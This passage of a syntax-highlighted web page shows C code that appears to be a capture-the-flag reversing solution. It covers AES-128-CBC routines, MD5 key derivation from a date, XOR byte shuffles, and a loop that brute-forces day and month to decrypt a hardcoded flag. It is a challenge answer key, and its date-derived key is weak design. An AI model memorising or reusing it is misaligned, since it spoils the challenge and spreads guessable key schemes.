class="number">4</span> * i + (j + <span class="number">2</span>) % <span class="number">4</span>];<span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">3</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">3</span>) % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = State[i][j] ^ exp_key[<span class="number">4</span> * (<span class="number">40</span> + j) + i];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)output[i] = State[i % <span class="number">4</span>][i / <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Aes解密函数</span></span><br><span class="line"><span class="type">void</span>  <span class="title function_">InvCipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">unsigned</span> <span class="type">char</span>* output, <span class="type">unsigned</span> <span class="type">char</span>* exp_key)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> round;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ttt[<span class="number">4</span> * <span class="number">4</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> State[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)State[i % <span class="number">4</span>][i / <span class="number">4</span>] = input[i];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = State[i][j] ^ exp_key[<span class="number">4</span> * (<span class="number">40</span> + j) + i];</span><br><span class="line"><span class="keyword">for</span> (round = <span class="number">9</span>; round &gt;= <span class="number">1</span>; round--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)ttt[<span class="number">4</span> * i + j] = State[i][j];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>;i &lt; <span class="number">4</span>;i++)<span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">1</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">3</span>) % <span class="number">4</span>];<span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">2</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">2</span>) % <span class="number">4</span>];<span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">3</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">1</span>) % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = AesiSbox[State[i][j]];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = State[i][j] ^ exp_key[<span class="number">4</span> * ((round * <span class="number">4</span>) + j) + i];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) ttt[<span class="number">4</span> * i + j] = State[i][j];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">State[<span class="number">0</span>][j] = Ff(ttt[j]) ^ FD(ttt[<span class="number">4</span> + j]) ^ FE(ttt[<span class="number">4</span> * <span class="number">2</span> + j]) ^ FC(ttt[<span class="number">4</span> * <span class="number">3</span> + j]);</span><br><span class="line">State[<span class="number">1</span>][j] = FC(ttt[j]) ^ Ff(ttt[<span class="number">4</span> + j]) ^ FD(ttt[<span class="number">4</span> * <span class="number">2</span> + j]) ^ FE(ttt[<span class="number">4</span> * <span class="number">3</span> + j]);</span><br><span class="line">State[<span class="number">2</span>][j] = FE(ttt[j]) ^ FC(ttt[<span class="number">4</span> + j]) ^ Ff(ttt[<span class="number">4</span> * <span class="number">2</span> + j]) ^ FD(ttt[<span class="number">4</span> * <span class="number">3</span> + j]);</span><br><span class="line">State[<span class="number">3</span>][j] = FD(ttt[j]) ^ FE(ttt[<span class="number">4</span> + j]) ^ FC(ttt[<span class="number">4</span> * <span class="number">2</span> + j]) ^ Ff(ttt[<span class="number">4</span> * <span class="number">3</span> + j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)ttt[<span class="number">4</span> * i + j] = State[i][j];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>;i &lt; <span class="number">4</span>;i++)<span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">1</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">3</span>) % <span class="number">4</span>];<span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">2</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">2</span>) % <span class="number">4</span>];<span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">3</span>)State[i][j] = ttt[<span class="number">4</span> * i + (j + <span class="number">1</span>) % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = AesiSbox[State[i][j]];</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">4</span>;i++)State[i][j] = State[i][j] ^ exp_key[<span class="number">4</span> * j + i];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)output[i] = State[i % <span class="number">4</span>][i / <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************</span></span><br><span class="line"><span class="comment">*函数功能: AES加密, 模式CBC,数据块128位,填充方式:pkcs5padding</span></span><br><span class="line"><span class="comment">* 参数:</span></span><br><span class="line"><span class="comment">* input_buff:需要加密的数组指针</span></span><br><span class="line"><span class="comment">* InputLen:加密数据的字节长度</span></span><br><span class="line"><span class="comment">* p_key:   指向密钥数据的指针,  1~16字节长度</span></span><br><span class="line"><span class="comment">* output_buff:加密结果输出指针</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 返回值: OutLength 加密后的输出长度</span></span><br><span class="line"><span class="comment">*********************************************************/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">AES128_CBC_Encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* input_buff, <span class="type">unsigned</span> <span class="type">long</span> InputLen, <span class="type">unsigned</span> <span class="type">char</span>* p_key, <span class="type">unsigned</span> <span class="type">char</span>* output_buff, <span class="type">unsigned</span> <span class="type">char</span>* iv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> OutLength = <span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> i, j;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* lpCurInBuff = input_buff;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* lpCurOutBuff = output_buff;</span><br><span class="line"><span class="type">long</span> blocknum = InputLen / <span class="number">16</span>;</span><br><span class="line"><span class="type">long</span> leftnum = InputLen % <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> row;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">4</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ex_key[<span class="number">16</span> * <span class="number">15</span>];</span><br><span class="line"><span class="keyword">for</span> (row = <span class="number">0</span>;row &lt; <span class="number">4</span>;row++)       <span class="comment">//拷贝seed 密钥</span></span><br><span class="line">&#123;</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">0</span>] = *(p_key + <span class="number">4</span> * row);</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">1</span>] = *(p_key + <span class="number">4</span> * row + <span class="number">1</span>);</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">2</span>] = *(p_key + <span class="number">4</span> * row + <span class="number">2</span>);</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">3</span>] = *(p_key + <span class="number">4</span> * row + <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (row = <span class="number">4</span>;row &lt; <span class="number">44</span>;row++)</span><br><span class="line">&#123;</span><br><span class="line">temp[<span class="number">0</span>] = ex_key[<span class="number">4</span> * row - <span class="number">4</span>];     <span class="comment">//当前列的前一列  </span></span><br><span class="line">temp[<span class="number">1</span>] = ex_key[<span class="number">4</span> * row - <span class="number">3</span>];</span><br><span class="line">temp[<span class="number">2</span>] = ex_key[<span class="number">4</span> * row - <span class="number">2</span>];</span><br><span class="line">temp[<span class="number">3</span>] = ex_key[<span class="number">4</span> * row - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (row % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> exchange_buff = <span class="number">0</span>;</span><br><span class="line">exchange_buff = temp[<span class="number">0</span>];</span><br><span class="line">temp[<span class="number">0</span>] = AesSbox[<span class="number">16</span> * (temp[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + (temp[<span class="number">1</span>] &amp; <span class="number">0x0f</span>)];</span><br><span class="line">temp[<span class="number">1</span>] = AesSbox[<span class="number">16</span> * (temp[<span class="number">2</span>] &gt;&gt; <span class="number">4</span>) + (temp[<span class="number">2</span>] &amp; <span class="number">0x0f</span>)];</span><br><span class="line">temp[<span class="number">2</span>] = AesSbox[<span class="number">16</span> * (temp[<span class="number">3</span>] &gt;&gt; <span class="number">4</span>) + (temp[<span class="number">3</span>] &amp; <span class="number">0x0f</span>)];</span><br><span class="line">temp[<span class="number">3</span>] = AesSbox[<span class="number">16</span> * (exchange_buff &gt;&gt; <span class="number">4</span>) + (exchange_buff &amp; <span class="number">0x0f</span>)];</span><br><span class="line"></span><br><span class="line">temp[<span class="number">0</span>] = temp[<span class="number">0</span>] ^ AesRcon[<span class="number">4</span> * (row / <span class="number">4</span>) + <span class="number">0</span>];</span><br><span class="line">temp[<span class="number">1</span>] = temp[<span class="number">1</span>] ^ AesRcon[<span class="number">4</span> * (row / <span class="number">4</span>) + <span class="number">1</span>];</span><br><span class="line">temp[<span class="number">2</span>] = temp[<span class="number">2</span>] ^ AesRcon[<span class="number">4</span> * (row / <span class="number">4</span>) + <span class="number">2</span>];</span><br><span class="line">temp[<span class="number">3</span>] = temp[<span class="number">3</span>] ^ AesRcon[<span class="number">4</span> * (row / <span class="number">4</span>) + <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">0</span>] = ex_key[<span class="number">4</span> * (row - <span class="number">4</span>) + <span class="number">0</span>] ^ temp[<span class="number">0</span>];</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">1</span>] = ex_key[<span class="number">4</span> * (row - <span class="number">4</span>) + <span class="number">1</span>] ^ temp[<span class="number">1</span>];</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">2</span>] = ex_key[<span class="number">4</span> * (row - <span class="number">4</span>) + <span class="number">2</span>] ^ temp[<span class="number">2</span>];</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">3</span>] = ex_key[<span class="number">4</span> * (row - <span class="number">4</span>) + <span class="number">3</span>] ^ temp[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; blocknum;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)lpCurOutBuff[j] = lpCurInBuff[j] ^ iv[j];</span><br><span class="line">Cipher(lpCurOutBuff, lpCurOutBuff, ex_key);</span><br><span class="line"><span class="built_in">memcpy</span>(iv, lpCurOutBuff, <span class="number">16</span>);</span><br><span class="line">lpCurInBuff += <span class="number">16</span>;</span><br><span class="line">lpCurOutBuff += <span class="number">16</span>;</span><br><span class="line">OutLength += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (leftnum)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inbuff[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">memset</span>(inbuff, <span class="number">16</span> - leftnum, <span class="number">16</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(inbuff, lpCurInBuff, leftnum);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)lpCurOutBuff[j] = inbuff[j] ^ iv[j];</span><br><span class="line">Cipher(lpCurOutBuff, lpCurOutBuff, ex_key);</span><br><span class="line"><span class="built_in">memcpy</span>(iv, lpCurOutBuff, <span class="number">16</span>);</span><br><span class="line">lpCurOutBuff += <span class="number">16</span>;</span><br><span class="line">OutLength += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> extrabuff[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">memset</span>(extrabuff, <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)lpCurOutBuff[j] = extrabuff[j] ^ iv[j];</span><br><span class="line">Cipher(lpCurOutBuff, lpCurOutBuff, ex_key);</span><br><span class="line"><span class="built_in">memcpy</span>(iv, lpCurOutBuff, <span class="number">16</span>);</span><br><span class="line">OutLength += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OutLength;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*******************************************************</span></span><br><span class="line"><span class="comment">*函数功能: AES解密, 模式CBC,数据块128位,填充方式:pkcs5padding</span></span><br><span class="line"><span class="comment">* 参数:</span></span><br><span class="line"><span class="comment">* input_buff:需要解密的数组指针</span></span><br><span class="line"><span class="comment">* InputLen:需要解密数据的字节长度</span></span><br><span class="line"><span class="comment">* p_key:   指向密钥数据的指针,  1~16字节长度</span></span><br><span class="line"><span class="comment">* output_buff:加密结果输出指针</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 返回值: OutLength 加密后的输出长度</span></span><br><span class="line"><span class="comment">********************************************************/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">AES128_CBC_Decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* input_buff, <span class="type">unsigned</span> <span class="type">long</span> InputLen, <span class="type">unsigned</span> <span class="type">char</span>* p_key, <span class="type">unsigned</span> <span class="type">char</span>* output_buff, <span class="type">unsigned</span> <span class="type">char</span>* iv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> OutLength = <span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> blocknum = InputLen / <span class="number">16</span>;</span><br><span class="line"><span class="type">long</span> leftnum = InputLen % <span class="number">16</span>;</span><br><span class="line"><span class="type">long</span> i, j;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* pCurInBuf = input_buff;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* pCurOutBuf = output_buff;</span><br><span class="line"><span class="type">int</span> row;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ex_key[<span class="number">16</span> * <span class="number">15</span>];</span><br><span class="line"><span class="keyword">for</span> (row = <span class="number">0</span>;row &lt; <span class="number">4</span>;row++)</span><br><span class="line">&#123;</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">0</span>] = *(p_key + <span class="number">4</span> * row);</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">1</span>] = *(p_key + <span class="number">4</span> * row + <span class="number">1</span>);</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">2</span>] = *(p_key + <span class="number">4</span> * row + <span class="number">2</span>);</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">3</span>] = *(p_key + <span class="number">4</span> * row + <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (row = <span class="number">4</span>;row &lt; <span class="number">44</span>;row++)</span><br><span class="line">&#123;</span><br><span class="line">temp[<span class="number">0</span>] = ex_key[<span class="number">4</span> * row - <span class="number">4</span>];     <span class="comment">//当前列的前一列  </span></span><br><span class="line">temp[<span class="number">1</span>] = ex_key[<span class="number">4</span> * row - <span class="number">3</span>];</span><br><span class="line">temp[<span class="number">2</span>] = ex_key[<span class="number">4</span> * row - <span class="number">2</span>];</span><br><span class="line">temp[<span class="number">3</span>] = ex_key[<span class="number">4</span> * row - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (row % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> exchange_buff = <span class="number">0</span>;</span><br><span class="line">exchange_buff = temp[<span class="number">0</span>];</span><br><span class="line">temp[<span class="number">0</span>] = AesSbox[<span class="number">16</span> * (temp[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) + (temp[<span class="number">1</span>] &amp; <span class="number">0x0f</span>)];</span><br><span class="line">temp[<span class="number">1</span>] = AesSbox[<span class="number">16</span> * (temp[<span class="number">2</span>] &gt;&gt; <span class="number">4</span>) + (temp[<span class="number">2</span>] &amp; <span class="number">0x0f</span>)];</span><br><span class="line">temp[<span class="number">2</span>] = AesSbox[<span class="number">16</span> * (temp[<span class="number">3</span>] &gt;&gt; <span class="number">4</span>) + (temp[<span class="number">3</span>] &amp; <span class="number">0x0f</span>)];</span><br><span class="line">temp[<span class="number">3</span>] = AesSbox[<span class="number">16</span> * (exchange_buff &gt;&gt; <span class="number">4</span>) + (exchange_buff &amp; <span class="number">0x0f</span>)];</span><br><span class="line">temp[<span class="number">0</span>] = temp[<span class="number">0</span>] ^ AesRcon[<span class="number">4</span> * (row / <span class="number">4</span>) + <span class="number">0</span>];</span><br><span class="line">temp[<span class="number">1</span>] = temp[<span class="number">1</span>] ^ AesRcon[<span class="number">4</span> * (row / <span class="number">4</span>) + <span class="number">1</span>];</span><br><span class="line">temp[<span class="number">2</span>] = temp[<span class="number">2</span>] ^ AesRcon[<span class="number">4</span> * (row / <span class="number">4</span>) + <span class="number">2</span>];</span><br><span class="line">temp[<span class="number">3</span>] = temp[<span class="number">3</span>] ^ AesRcon[<span class="number">4</span> * (row / <span class="number">4</span>) + <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">0</span>] = ex_key[<span class="number">4</span> * (row - <span class="number">4</span>) + <span class="number">0</span>] ^ temp[<span class="number">0</span>];</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">1</span>] = ex_key[<span class="number">4</span> * (row - <span class="number">4</span>) + <span class="number">1</span>] ^ temp[<span class="number">1</span>];</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">2</span>] = ex_key[<span class="number">4</span> * (row - <span class="number">4</span>) + <span class="number">2</span>] ^ temp[<span class="number">2</span>];</span><br><span class="line">ex_key[<span class="number">4</span> * row + <span class="number">3</span>] = ex_key[<span class="number">4</span> * (row - <span class="number">4</span>) + <span class="number">3</span>] ^ temp[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; blocknum;i++)</span><br><span class="line">&#123;</span><br><span class="line">InvCipher(pCurInBuf, pCurOutBuf, ex_key);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">pCurOutBuf[j] = pCurOutBuf[j] ^ iv[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(iv, pCurInBuf, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span> (i == (blocknum - <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span> (pCurOutBuf[<span class="number">15</span>] != <span class="number">0x10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pCurOutBuf[<span class="number">15</span>] &lt; <span class="number">0x10</span>)</span><br><span class="line">&#123;</span><br><span class="line">OutLength = InputLen - pCurOutBuf[<span class="number">15</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(temp, pCurOutBuf, <span class="number">16</span> - pCurOutBuf[<span class="number">15</span>]);</span><br><span class="line"><span class="built_in">memcpy</span>(pCurOutBuf, temp, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">OutLength = InputLen - <span class="number">16</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(pCurOutBuf, temp, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pCurInBuf += <span class="number">16</span>;</span><br><span class="line">pCurOutBuf += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> OutLength;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">md5</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* encrypt,<span class="type">unsigned</span> <span class="type">char</span>* decrypt)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">MD5_CTX md5;</span><br><span class="line">MD5Init(&amp;md5);</span><br><span class="line">MD5Update(&amp;md5, encrypt, <span class="number">0xc</span>);</span><br><span class="line">MD5Final(&amp;md5, decrypt);</span><br><span class="line"><span class="comment">//for (i = 0; i &lt; 16; i++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%02x&quot;, decrypt[i]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">initkey</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* a1, <span class="type">char</span> day, <span class="type">char</span> month)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> year = <span class="number">2024</span><span class="number">-1900</span>;</span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [esp+4h] [ebp-24h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line"><span class="type">char</span> Src[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line"><span class="type">char</span>* src = Src;</span><br><span class="line"><span class="built_in">memset</span>(Src, <span class="number">0</span>, <span class="keyword">sizeof</span>(Src));</span><br><span class="line">Src[<span class="number">0</span>] = day;</span><br><span class="line">Src[<span class="number">4</span>] = month - <span class="number">1</span>;</span><br><span class="line">Src[<span class="number">8</span>] = year;</span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 0xc; i++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%02x &quot;, Src[i]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">md5(Src, a1);</span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 16; i++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%x &quot;, a1[i]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i)</span><br><span class="line">a1[i] ^= <span class="number">0x14u</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j)</span><br><span class="line">a1[j] ^= <span class="number">0x11u</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">de1</span><span class="params">(<span class="type">char</span>* flag)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] ^= <span class="number">0x11</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">de2</span><span class="params">(<span class="type">char</span>* a1)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line"><span class="type">char</span> v2; <span class="comment">// [esp+7h] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">v2 = a1[i] ^ <span class="number">5</span>;</span><br><span class="line">a1[i] = a1[i + <span class="number">1</span>] ^ <span class="number">5</span>;</span><br><span class="line">a1[i + <span class="number">1</span>] = v2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">de3</span><span class="params">(<span class="type">char</span>* a1)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"><span class="type">char</span> v3; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">15</span>; v2 &lt; i; --i)</span><br><span class="line">&#123;</span><br><span class="line">v3 = a1[v2] ^ <span class="number">0xF</span>;</span><br><span class="line">a1[v2] = a1[i] ^ <span class="number">0xF</span>;</span><br><span class="line">a1[i] = v3;</span><br><span class="line">++v2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> day=<span class="number">6</span>, month=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (month = <span class="number">0</span>; month &lt; <span class="number">13</span>; month++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> ( day = <span class="number">0</span>; day &lt; <span class="number">31</span>; day++)</span><br><span class="line">&#123;</span><br><span class="line">initkey(key, day, month);</span><br><span class="line">de2(key);</span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 16; i++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%x &quot;, key[i]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> iv[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> flag[] = &#123; <span class="number">0xCD</span>, <span class="number">0x16</span>, <span class="number">0xDB</span>, <span class="number">0xB5</span>, <span class="number">0xD1</span>, <span class="number">0x02</span>, <span class="number">0xA4</span>, <span class="number">0x82</span>, <span class="number">0x8E</span>, <span class="number">0x59</span>, <span class="number">0x73</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">0x26</span>, <span class="number">0x56</span>, <span class="number">0xF2</span>,</span><br><span class="line"><span class="number">0x16</span>, <span class="number">0x8E</span>, <span class="number">0x46</span>, <span class="number">0xF2</span>, <span class="number">0x55</span>, <span class="number">0x7B</span>, 